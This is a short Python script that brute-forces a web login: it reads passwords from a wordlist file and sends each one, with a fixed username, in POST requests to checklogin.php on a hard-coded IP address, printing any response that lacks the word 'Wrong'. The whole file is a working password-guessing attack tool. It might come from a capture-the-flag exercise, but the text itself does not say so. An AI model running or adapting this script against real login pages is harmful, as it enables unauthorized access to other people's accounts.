import urllib.request

import requests

with open('dictionary') as d:
	for line in d:

		if len(line) < 12:
			url = "http://18.202.140.65/checklogin.php?myusername=asda&mypassword=%s&Submit=Login" % line

			r = requests.post(url)
			if "Wrong" not in str(r.text):
				print(line)

				print("--------")
				print("--------")

				print(r.text)
	




